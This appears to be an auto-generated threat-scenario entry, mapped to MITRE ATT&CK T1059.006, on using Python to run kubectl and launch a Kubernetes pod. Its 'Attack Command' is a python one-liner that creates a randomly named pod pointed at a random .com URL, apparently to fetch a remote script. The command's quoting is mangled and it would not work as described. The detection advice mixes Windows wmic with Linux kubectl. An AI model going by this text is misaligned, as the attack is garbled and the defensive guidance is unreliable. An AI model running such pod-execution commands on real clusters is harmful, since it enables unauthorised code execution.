---
type: campaign
scenario_id: 266
tactic: Execution
technique: "T1059.006: Python"
technique_id: T1059.006
tags: [campaign, lotl, execution]
---

# Using Python to abuse kubectl for Kubernetes pod execution.

## Threat Description
Using Python to abuse kubectl for Kubernetes pod execution.

## Attack Command
```
python -c "import os; os.system('kubectl run $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) --image=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) --restart=Never --command -- /bin/sh -c ''http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh''')"
```

## Detection Logic
Monitor kubectl: `wmic process where name='python.exe' get commandline | findstr kubectl`; Audit Kubernetes logs: `kubectl logs`.

## Mitigation
Restrict kubectl: `chmod 700 /usr/local/bin/kubectl`; Enforce RBAC: Kubernetes policies.

## AI Training Prompt
Train AI to detect kubectl pod execution and suggest RBAC enforcement.

## References
- MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
